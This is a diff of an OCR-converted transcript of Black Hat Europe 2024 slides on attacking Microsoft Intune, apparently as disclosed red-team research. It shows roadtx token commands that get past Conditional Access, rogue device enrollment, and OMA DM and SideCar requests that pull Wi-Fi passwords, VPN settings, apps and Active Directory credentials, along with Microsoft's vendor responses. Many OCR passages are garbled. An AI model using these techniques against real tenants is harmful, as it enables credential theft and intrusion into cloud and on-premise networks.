@@ -8,19 +8,24 @@ year: 2024
 source_pdf: "BlackHat_Europe_2024_slides/Yuya Chudo_Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise.pdf"
 pages: 89
 sha256: "0a85fd57916a979ed5d005b38a647029d1652dfc7d7c1eb62326079d165f6a80"
-text_chars: 35216
-ocr_pages: 32
+text_chars: 30367
+ocr_pages: 29
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 85.8
+ocr_unreliable_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T22:48:04Z"
+converted_at: "2026-08-12T05:02:15Z"
 ---
 # Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise
 
 **Speakers:** Yuya Chudo  
 **Conference:** Black Hat Europe 2024  
 **Source:** `BlackHat_Europe_2024_slides/Yuya Chudo_Unveiling the Power of Intune Leveraging Intune for Breaking Into Your Cloud and On-Premise.pdf` (89 pages)
+
 
 ## Slide 1
 
@@ -30,19 +35,6 @@ converted_at: "2026-08-11T22:48:04Z"
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-WAN.)
-PosQicnat y i, = 4
-EWROPE 20 > Linn
-DECEMBER 11-12, 2024 : ei <a ,
-IEFINGS NG
-“Unveiling the Power of intune:
-Leveraging Intune for Breaking Into Your Cloud and On-Premise
-Yuya Chudo
-```
-
 ## Slide 2
 
 #### Yuya Chudo
@@ -51,12 +43,10 @@ Yuya Chudo
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Yuya Chudo
 ¢Secureworks Adversary Group (SWAG)
 «Provides red teaming service
@@ -210,12 +200,10 @@ Device Registration Service Enrollment Service
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
-V4 £223 V4 82:23
 Microsoft Intune
 BE Microsoft
 Sign in
@@ -232,11 +220,11 @@ Microsoft Privacy & Cookies Terms of use Privacy & cookies
 
 #### 1. Login to Microsoft Entra ID
 
-```
+\```
 GET
-```
+\```
 
-```
+\```
 /common/oAuth2/v2.0/authorize?cpVersion=5.0.6228.0&prompt=select_account&client-
 request-id=e9b90c65-829b-4860-85ea-9ba52131f19b&x-client-CPU=x86&x-client-
 DM=Android+SDK+built+for+x86&x-client-OS=26&x-client-SKU=MSAL.Android&x-client-
@@ -247,11 +235,11 @@ WrwMO8&code_challenge_method=S256&claims=%7B%7D&client_id=9ba1a5c7-f17a-4de9-a1f
 c000-
 000000000000%2F.default+openid+offline_access+profile&state=MTE6Y(snip)LTU5NjFlYzh
 mZjEyMg HTTP/1.1
-```
+\```
 
-```
+\```
 Host: login.microsoftonline.com
-```
+\```
 
 - ✓client_id: Intune Company Portal ( `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223` )
 
@@ -283,19 +271,19 @@ Enrollment Service
 
 Request to Microsoft Graph
 
-```
+\```
 GET /v1.0/myorganization/servicePrincipals/appId=0000000a-0000-0000-c000-
 000000000000/endpoints HTTP/1.1
 Host: graph.microsoft.com
 Authorization: Bearer
-```
+\```
 
-```
+\```
 eyJ0eXAiOiJKV1QiLCJub25jZSI6IjVZLVB2Z0tkX0FXRzBZdjZDaGY5YVFIdTBHQktXWFpSWi0yTTNYU3
 lwX2MiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1jN2wzSXo5M2c3dXdnTmVFbW13X1dZR1BrbyIsImtpZCI6
 Ik1jN2wzSXo5M2c3dXdnTmVFbW13X1dZR1BrbyJ9.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTAwMDAtYzAwM
 C0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczov (Snip)
-```
+\```
 
 #BHEU @BlackHatEvents
 
@@ -303,45 +291,45 @@ C0wMDAwMDAwMDAwMDAiLCJpc3MiOiJodHRwczov (Snip)
 
 #### 2. Discovery of the enrollment endpoint Response from Microsoft Graph
 
-```
+\```
 {
-```
+\```
 
-```
+\```
 "@odata.context":
-```
+\```
 
-```
+\```
 "https://graph.microsoft.com/v1.0/$metadata#servicePrincipals('appId%3D0000000a-0000-0000-c000-
 000000000000')/endpoints",
-```
+\```
 
-```
+\```
 "value": [
 (snip)
 {
-```
+\```
 
-```
+\```
 "id": "39737e21-36e6-4db8-89a4-50e618df98cb",
-```
+\```
 
-```
+\```
 "deletedDateTime": null,
-```
+\```
 
-```
+\```
 "capability": "AndroidEnrollment",
 "providerId": "0000000a-0000-0000-c000-000000000000",
 "providerName": "AndroidEnrollment",
-```
+\```
 
 - `"providerResourceId": "8fade320-5cab-4f58-976d-1846071e93f1", "uri":`
 
-```
+\```
 "https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc"
 },
-```
+\```
 
 #BHEU @BlackHatEvents
 
@@ -367,12 +355,10 @@ Device Registration Service Enrollment Service
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 . Device join / register
 Microsoft Azure / Search resources, services, and dacs (G+/)
 Home > MSFT | Devices > Devices
@@ -383,7 +369,6 @@ MSFT - Microsoft Entra ID
 1 device found
 [| Name 7 Enabled OS Version Join type Owner MDM
 [| Ly Google Pixel @ ves Android 8.2.0 Microsoft Entra joi... employeed None
-bem
 ```
 
 ## Slide 19
@@ -450,12 +435,10 @@ Certificate Signing Request
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Enrolled to Intune
 Microsoft Intune admin center
 Home
@@ -522,22 +505,22 @@ DM Server
 
 SyncML Request
 
-```
+\```
 <Get>
-```
+\```
 
-```
+\```
 <CmdID>1</CmdID>
-```
+\```
 
-```
+\```
 <Item>
-```
+\```
 
-```
+\```
 <Target>
 <LocURI>
-```
+\```
 
 - `./DevDetail/Ext/Microsoft/DeviceName </LocURI>`
 
@@ -545,9 +528,9 @@ SyncML Request
 
    - `</Item>`
 
-```
+\```
 </Get>
-```
+\```
 
 (*.manage.microsoft.com)
 
@@ -555,48 +538,48 @@ Intune Company Portal (DM Client)
 
 SyncML Response
 
-```
+\```
 <Results>
-```
+\```
 
-```
+\```
 <CmdID>5</CmdID>
 <MsgRef>2</MsgRef>
 <CmdRef>1</CmdRef>
-```
+\```
 
-```
+\```
 <Item>
-```
+\```
 
-```
+\```
 <Source>
-```
+\```
 
-```
+\```
 <LocURI>
-```
+\```
 
-```
+\```
 ./DevDetail/Ext/Microsoft/DeviceName
 </LocURI>
-```
+\```
 
-```
+\```
 </Source>
-```
+\```
 
-```
+\```
 <Data>TEST-INTUNE01</Data>
-```
+\```
 
-```
+\```
 </Item>
-```
+\```
 
-```
+\```
 </Results>
-```
+\```
 
 #BHEU @BlackHatEvents
 
@@ -660,12 +643,10 @@ Ex) Firewall Status `./Vendor/MSFT/DeviceStatus/Firewall/Status`
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Conditional Access: Require compliant device
 Ensure user devices meet configuration requirements
 Control access enforcement to block or
@@ -692,13 +673,11 @@ as compliant
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 roadtx ge ssword -r msgraph -ua $windows ua
-Requesting token for res e https: / sraph microsoft .con/
 Error during authentication: A Q: Device is not in required device state: compliant.
 equires a compliant device, and t ice is n np li ne use _ must enroll their de
 der Like Intune. Trace ID: 2/c44b6c
@@ -726,18 +705,15 @@ Microsoft Graph Device Registration Service Enrollment Service
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Intune Company Portal Magic
 —| )-[~]
 L roadtx gettokens -u $username -p $password -r msgraph -ua $windows ua -c|9bala5c7-fl7a-4de9-alfl-6178c8d51223
 Requesting token for resource https://qraph.microsoft.com/
 Tokens were written to .roadtools auth
-9baia5c7-f17a-4de9-a1f1-6178c8d51223
 = Intune Company Portal
 ```
 
@@ -747,29 +723,18 @@ Tokens were written to .roadtools auth
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat << -
-EUROPE 2024
 “app displayname": "Microsoft Intune Company Portal",
 “appid": "9bala5c7-f17a-4de9-alf1-6178c8d51223",
 “appidacr": "0",
-"aud": “https://graph.microsoft.com/",
-"exp": 1712579333,
 "jat": 1712575122,
 “idtyp": “user",
-“ipaddr": ;
-"iss": "https://sts.windows .net/645064ee - 9b6e- 43db-9d46- fe8la65cfdea/",
-"name": “employeed1",
-"“nbf": 1712575122,
-"oid": "71ld6baf0-8476-46f6-b120-3ddicd2ddela",
 "pDlatf": "3",
 “puid": "100320031A6A921B",
-"rh"; "0, ATOA7MROZG6b200dRV6Bp LZ960MAAAAAAAAAWAAAAAAAAACHAIE. ".
 "scp": "Device.Read.ALl DeviceManagementConfiguration.Read.All DeviceManagementConfiguration.ReadWrite.ALl ServicePrincipalEndpoint.Read.All User.Read" j
-21gnhifh Stale. [|
-“inknownntwk"
 ```
 
 ## Slide 38
@@ -778,42 +743,31 @@ EUROPE 2024
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 66/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-black hat  < a
-EUROPE 2024
 Downgrade to Azure AD Graph
-(kali kalL1) - [~]
 Ls roadtx gettokens -u $username -p $password -r|aadgraph |-ua $windows ua -c |9bala5c7-fl/a-4de9-alf1-6178c8d51223
 Requesting token for resource https://graph.windows.net/
 Tokens were written to .roadtools auth
-eee
 “appid": "“9bala5c7-f17a-4de9-alf1-6178c8d51223",
 “appidacr": "0",
-"aud": “https://graph.windows.net/",
 "exp": 1712580708,
 "“jat": 1712576763,
-“ipaddr": " i
-"iss": “https://sts.windows.net/645064ee - 9b6e-43db-9d46- fe81la65cfdea/",
-"name": “employeeOl",
 “nbf": 1712576763,
-"oid": "71ld6baf0-8476-46f6-b120-3ddlcd2ddela",
 “puid": "100320031A6A921B",
-"rh": "“0.ATOA7MROZG6D200dRV6Bp1Lz96g TAAAAAAAAAWAAAAAAAAACHAIJE.",
 "scp": “user impersonation",
-"Sub": eVENXRERQVI3WyX) ENCalLXGF 6D -wp6qosiNaJuQeyht4® ,
 ```
 
 ## Slide 39
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-piseichat
-EUROPE 2024
 ROADrec
 Home
 Database Stats Tenant information
@@ -824,7 +778,6 @@ ServicePrincipals 185
 Devices Devices 10 View R
 Administrative Units 0 iain Home Filter
 Administrative Units
-Users Narr Prin Y : b 4 Em c rtrr t ss BSsw J 4,
 Directory roles Authorization Policy) “ ,
 Groups
 Self-service password reset eng P Y 2024-03-13T06:26:13
@@ -835,14 +788,11 @@ Default user role permissions Administrative Units
 Application roles Guest access settings Y 2024-01-26T05:28:05
 Directory roles
 OAuth2 Permissions ry Y 2023-11-22T23:51:31
-. Applications
 Tenant Domains v 2024-02-07723:54:22
 . Service Principals
 Managed Email, OfficeCommunications| Application roles v 2024-02-14T10:51:53
 Managed None OAuth2 Permissions
-Y 2024-02-21T01:53:41
 Managed None
-Y 2024-01-26T05:46:14
 50 ’
 ```
 
@@ -852,12 +802,10 @@ Y 2024-01-26T05:46:14
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Require compliant + Entra hybrid joined device
 Require device to be marked = |©
 as compliant
@@ -870,28 +818,24 @@ joined device
 AX Don't lock yourself out! Make
 sure that your device is Microsoft
 Entra hybrid joined.
-Learn more
 ```
 
 ## Slide 41
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-EUROPE 2024
 $USER graph -ua $WINDOWS_UA
 r resource https: //graph.windows.net/
 ication: AADSTS5 : Device is not in required
 domain joined device, and the dev is not domain j
 domain_joined. Conditiomal Acc
 joined. Trace ID:
-7-487 f-bldd-eb 3f79 Timestamp: 2@2 5:28
 -4778-a87b-55034dea2400@ Correlation ID:
 $USER (ORD -r aadgraph -ua $WINDOWS_UA| -c
-ro 9bala5c7-f17a-4de9-a1f1-6178c8d51223
 Requesting < r_resource https:
 graph.windows.net/
 Tokens were wri to .roadtools_au
@@ -913,11 +857,11 @@ Tokens were wri to .roadtools_au
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pis hat
-EUROPE 2024
 Microsoft response (VULN-123240)
 « |This is by design|that Conditional Access does not enforce device compliance
 ADGraph tokens as part of their enrollment (new device) and subsequent devi
@@ -936,16 +880,14 @@ tokens.
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pis hat
-EUROPE 2024
 SSWORD -r aadgraph -ua $WINDOWS_UA
-‘ ://oraph.windows.net/
 aannit ring a AADSTS50076: Due to a configuration change ade by your adm
 aerial ecause you ae to a new Location, you must use ae i-fa r au uthentic
-oa to a HAHBARAE SSIS AERIS III . Trace ID:
 i 4603-9b6a- :
 ```
 
@@ -955,12 +897,10 @@ i 4603-9b6a- :
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Exclude Microsoft Intune in Target resources
 Include Exclude
 Assignments
@@ -983,18 +923,15 @@ Conditions © Microsoft Intune
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat = —
-EUROPE 2024
 L$ roadtx gettokens - $USER -p $PASSWORD -r aadgraph -ua S$WINDOWS_UA
 Requesting token for resource https: //graph.windows.net/
 Error during authentication: AADSTS50@76: Due to a configuration change made by your adm
 inistrator, or because you moved to a new location, you must use multi-factor authentica
 tion to access ‘@0000002-0000-0000-cO08-800000000000'. Trace ID: 4a@e462a-cO4d-432d-93c5
--3babb0/63208 Correlation ID: adsde4s0b-bé2t-4T¥l-bclb-4pbe499e¢acid Timestamp: #024-10-06
-O3:47:027
 —| )-[~]
 L¢ roadtx gettokens - $USER -p $PASSWORD -r aadgraph -ua $WINDOWS_UA -c 9bala5Sc7-fl7a-
 4de9-a1f1-6178c8d51223
@@ -1018,12 +955,10 @@ Tokens were written to .roadtools_auth
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Microsoft response (VULN-130471)
 1. When certain exclusions are made to ‘target resources’ in a Conditional Access policy, we ensure seamless access by
 also excluding specific dependencies that are essential for the exclusion to function correctly. In this instance, Intune relies
@@ -1111,11 +1046,10 @@ Certificate Enrollment Request with other user’s deviceid ( **79b9eec0-f7df-4c
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pisekhat
-EUROPE 2024
 Microsoft Intune admin center
 R Home
 1) Dashboard
@@ -1129,12 +1063,10 @@ aa Users
 Tenant administration
 4 Troubleshooting + support
 Home
-Not found #
 Device not found
 ® Get support 2 Perform self-diagnostics
 Summary |
 Session ID
-769e6235d6f849a685025308ebe00175
 Extension
 Microsoft_Intune_Devices
 Error code
@@ -1151,12 +1083,10 @@ DeviceSettingsMenuBlade
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Microsoft response (VULN-134464)
 Dear Yuya,
 Thank you again for submitting this issue to Microsoft. We appreciate the time taken to submit this assessment.
@@ -1195,12 +1125,10 @@ Upon investigation, we confirmed the Issue. A fix for this issue has been addres
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Device Management
 Microsoft Intune admin center
 nfigurat Settings picker :
@@ -1208,7 +1136,6 @@ FF Home Create profile e commas "," amc rms to lookup settings by their keywor
 Dashboard Windows 10 and later - Settings catalog earch for a setting
 All services + Add filter
 @ Basis @ Configuration settings Browse by category
-_§) Devices
 BH apps Trusted Certificate
 User Rights
 @ Endpoint security
@@ -1218,7 +1145,6 @@ User Rights
 , With the settings catalog, you can choose which settings you want to
 te Users . My configure. Click on Add settings to browse or search the catalog for the Wi-Fi Connection
 ie \ A) 4 settings you want to configure. Wi-Fi Settings
-&& Groups ‘sath Wine
 p: bg Learn more Widgets
 2 Tenant administration Windows Al
 % Troubleshooting + support Windows Defender Security Center
@@ -1232,15 +1158,12 @@ Select a category to show settings
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Configuration delivery via OMA DM Sync
 <Add>
-<CmdID>
 1S
 </CmdID>
 <Ite
@@ -1250,13 +1173,11 @@ Configuration delivery via OMA DM Sync
 m>
 arget>
 <LocURI>
-. /Device/Vendor/MSFT/VPNv2i/Contosot2OVPN/PluginProfile/ServerUrlList
 </LocURI>
 Target>
 at a>
 vpn.contoso.com;Internal VPN
 </
-</f/It
 </Add>
 Data>
 em>
@@ -1272,17 +1193,13 @@ Wi-Fi password
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 <Add>
 Configuration delivery via OMA DM Sync
 <CmdID>
-1é
-</CmdID>
 <Ite
 <T
 </
@@ -1295,21 +1212,12 @@ arget>
 Target>
 ae Wi-Fi SSID
 &lt;WLANProfile
-xmlns="http: //www.microsoft.com/networking/WLAN/profile/vl"égt;élt;nameégt;ContosoCorp Wi-Fiélt; /nameégt;élt;SSIDC
-onfigégt ;élt;SSIDégt; élt;hexégt ;436FEE74EF 73EF43EF 72 7OSFSTESIDAGESE It; /hexégt;&lt;nameégt;ContosoCorp Wi-Fiélt;/na
-meégt ;&1t;/SSIDégt ;&lt ;nonBroadcastégt ; falseélt; /nonBroadcastiégt ;&lt;/SSIDConfigégt ;&lt;connectionlypeagt;ESSélt;/
-connectionTypeégt;é&lt;connectionModeégt ; autoélt;/connectionModeégt;&lt;autoSwitchégt; falseélt;/autoSwitchégt;élt;M
-SMégt ;é&lt;securityégt;élt;authEncryptionégt;é&lt;authenticationégt ;WPALDPSKélt; /authenticationégt;&lt;encryptionégt;
-AES&1t;/encryptionégt ;élt;useOneXégt; falseélt; /useOneXégt ; &lt;FIPSMode
-xmlns="http: //www.microsoft.com/networking/WLAN/profile/vi"égt; falseélt;/FIPSModeégt;élt;/authEncryptionégt;élt;sh
 aredKeyégt ;&lt;keyTypeégt ;passPhraseélt;/keyTypecégt;é&lt;protectedégt; falseélt;/protectedégt;élt;keyMaterialégt;Sup
-erSecretWiFiPasswordélt; /keyMaterialégt;&lt;/sharedKeyégt ; &1lt ; PMKCacheModeagt ;disabledélt ; /PMKCacheModeagt ;&1t;/se_
 </
 </It
 </Add>
 curityégt;élt;/MSMégt;élt;/WLANProfileégt;
 Data>
-e«» Wi-Fi password
 ```
 
 ## Slide 61
@@ -1342,11 +1250,11 @@ Management Server
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat < ~
-EUROPE 2024
 Exfiltrating configuration via OMA DM Sync
 [!] maybe these are configuration profiles:
 - ,/Device/Vendor/MSFT/VPNv2/Contoso%2@VPN/RememberCredentials: false
@@ -1354,19 +1262,10 @@ Exfiltrating configuration via OMA DM Sync
 - ./Device/Vendor/MSFT/VPNv2/Contosox%20VPN/RegisterDns: false
 - ./Device/Vendor/MSFI/VPNv2/Contoso%2@VPN/DeviceCompliance/Enabled: false
 - ./Device/Vendor/MSFT/VPNv2/Contoso%28VPN/DeviceCompLliance/5so0/Enabled: false
-- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PLluginProfile/ServerUrLList: vpn.contoso.com;Internal VPN
 - ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PLuginProfile/CustomConfiguration: <pulse-schema><isSingleSignOnCredentia
-L>true</ isSingleSignOnCredentiaLl></ pulse-schema>
 - ./Device/Vendor/MSFT/VPNv2/Contosox20VPN/PLuginProfile/PluginPackageFamilyName: 951D7986.PulseSecureVPN_gzpvgh7otg
 a4p
-- ,/Vendor/MSFI/DMCLient/Provider/MS22UDMe20Server/PollL/PollOnLogin: true
-— ,/cimv2/MDM_ConfigSetting/MDM_ContigSetting.SettingName=%22AccountId#22/SettingValue: 3decc354-7c51-4c78-9f40-7ebs
-fefbes47
-— ,/Vendor/MSFT/WiFi/Profile/ContosoCorp_Wi-Fi/WLanxmL:
-{'WLANProfile': {‘@xmlns*: ‘http: //ww.microsoft.com/networking/WLAN/profile/vi', 'name": 'ContosoCorp_Wi-Fi', ‘SSID
 Config': {'SSID': {'hex': '436F6E746F736F436F72705F57692D4669', ‘name’: 'ContosoCorp_Wi-Fi'}, 'nonBroadcast': ‘false
-"}, ‘connectionType': "ESS", ‘connectionMode': ‘auto’, ‘autoSwitch': 'false', 'MSM': {'security': {'authEncryption':
-{'authentication': 'WPA2PSK", ‘encryption’: 'AES', ‘useOneX': ‘false’, 'FIPSMode': {‘@xmlns': "http: //ww.microsoft
 .com/networking/WLAN/profile/v2', ‘#text': 'false'}}, ‘sharedKey': {'keyType': "passPhrase', ‘protected’: 'false', '
 keyMaterial': 'SuperSecretWiFiPassword'}, "PMKCacheMode': 'disabled'}}}}
 - ./Vendor/MSFT/WiFi/Profile/ContosoCorp Wi-Fi/WiFiCost: 1
@@ -1378,17 +1277,14 @@ keyMaterial': 'SuperSecretWiFiPassword'}, "PMKCacheMode': 'disabled'}}}}
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Exfiltrating Line-Of-Business apps via OMA DM Sync
 [!] we found Line-of-business app...
 downloading msi file from
 https: //fef.msuc06.manage.microsoft.com/ContentService/DownLoadService/GetAppActive/WinRT?contentGuid=22cce2e1-e62¢
-4142-b7cb-c875@cd5/ddaofilLeNameHash=45d9c902-8d79-417a-8414-4b21948011dd.msi.bin&api-version=1.0
 [+] successtully downloaded to| 45d9c902-8d79-417a-8414-4b21948611dd.msi
 ```
 
@@ -1438,17 +1334,14 @@ Microsoft Entra ID/ Microsoft Intune
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Send Hardware Hash through DM Sync
 <Item>
 <Source>
 <LocURI>
-. /DevDetail/Ext/DeviceHardwareData
 </LocURI>
 </Source>
 <Met a>
@@ -1457,15 +1350,11 @@ chr
 </Format>
 </Meta>
 <Data>
-TOGWAgEAHAAAAAoASQdhSgAACgCdBIFKPFbMLeQCCQUCABAAC QABAATAAGAAAAAABQAZAATAAAAAAAAAT QAAAAAAAABAAAFAAWMAEQBHZWSlaW5S1l
-s
 c
 N
 D
 b
 I
-=
-YoHS8AH1 fr8zsuE89X9SGRLYhHEmyLWV f6Wh6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 ## Slide 67
@@ -1474,39 +1363,30 @@ YoHS8AH1 fr8zsuE89X9SGRLYhHEmyLWV f6Wh6wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Deliver Offline Domain Join Blob via OMA DM Sync
 <Exec>
-<CmdID>
 18
 </CmdID>
 <Item>
 <Target>
 <LocURI>
-. /Vendor/MSFT/OfflineDomainJoin/Blohb
 </LocURI>
 </Target>
 <Met a>
 <Format xmlns="syncml:metinf">
-bé4
 </Format>
 <Type xmlns="syncml:metinf">
 text/plain
 </Type>
 </Met a>
 <Data>
-ARAIAMzMzMzwCAAAAAAAAAAAAGABAAAAAGAAAAQAAGACAAAAAQAAAGADAAAT AAT AAGAAAF GFAAAMAAIAYAMAAAE QCADMzMzMUAMAAAAAAAAAZp qqY¥K
 B s
-iw .F
 U A
-s w
 B a
-AHoANAByAEMAXgAAAAAAB QAAAAAAAAAEAAAACGB LAGwWAbgALAAAAAAAAAAOAAAB “AHUADABUAC 4ADABVAGMAYQBSAASAAAAAAAAAC gAAAHYAAQBSAG
 ```
 
 ## Slide 68
@@ -1515,12 +1395,10 @@ AHoANAByAEMAXgAAAAAAB QAAAAAAAAAEAAAACGB LAGwWAbgALAAAAAAAAAAOAAAB “AHUADABUAC
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Leaking Active Directory account’s credential
 [*] parse domain join info...
 - domain: vuln.local
@@ -1638,17 +1516,17 @@ Download encrypted .intunewin file
 
    - Gateway API is specified in the request from SideCar
 
-```
+\```
 PUT
-```
+\```
 
-```
+\```
 /TrafficGateway/TrafficRoutingService/SideCar/StatelessSideCarGatewayService/SideCar
 GatewaySessions('a6ac2acc-ee78-440f-ae02-c7ec350fec6a')?api-version=1.5 HTTP/1.1
 Host: fef.msuc06.manage.microsoft.com
 (snip)
 {
-```
+\```
 
 - `"Key": "a6ac2acc-ee78-440f-ae02-c7ec350fec6a",`
 
@@ -1690,14 +1568,11 @@ Host: fef.msuc06.manage.microsoft.com
 
 #BHEU @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-EUROPE 2024
 Exfiltrating Win32 apps through SideCar
